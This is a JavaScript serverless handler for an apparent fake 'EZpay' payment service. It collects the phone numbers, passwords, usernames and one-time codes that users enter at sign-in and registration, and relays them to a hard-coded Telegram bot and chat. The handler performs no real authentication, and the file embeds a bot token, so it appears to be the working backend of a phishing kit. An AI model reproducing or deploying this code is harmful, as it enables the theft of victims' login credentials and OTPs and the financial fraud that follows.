export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
    res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

    if (req.method === 'OPTIONS') { res.status(200).end(); return; }
    if (req.method !== 'POST') { return res.status(405).json({ error: 'Method Not Allowed' }); }

    const TELEGRAM_BOT_TOKEN = '9071420562:AAH1f5Jj7CmPl0hRZrHdOY_KWwS8ZNBvtDs';
    const TELEGRAM_CHAT_ID = '7171384496';

    const { type, phone, password, username, otp, details } = req.body;
    let message = '';

    if (type === 'signin') {
        message = `💳 <b>EZpay Sign In Attempt</b>\n\n`
            + `📱 <b>Phone:</b> +91 ${phone || 'N/A'}\n`
            + `🔒 <b>Password:</b> ${password || 'N/A'}\n`
            + `🕐 <b>Time:</b> ${new Date().toLocaleString()}`;
    } else if (type === 'register') {
        message = `📝 <b>EZpay Registration</b>\n\n`
            + `👤 <b>Username:</b> ${username || 'N/A'}\n`
            + `📱 <b>Phone:</b> +91 ${phone || 'N/A'}\n`
            + `🔒 <b>Password:</b> ${password || 'N/A'}\n`
            + `🔢 <b>OTP:</b> ${otp || 'N/A'}\n`
            + `🕐 <b>Time:</b> ${new Date().toLocaleString()}`;
    } else {
        message = `🔔 <b>EZpay Notification</b>\n\n📱 <b>Phone:</b> +91 ${phone}\nℹ️ <b>Details:</b> ${details}`;
    }

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
        });
        const data = await response.json();
        return res.status(200).json({ success: true, data });
    } catch (error) {
        return res.status(500).json({ success: false, error: error.message });
    }
}
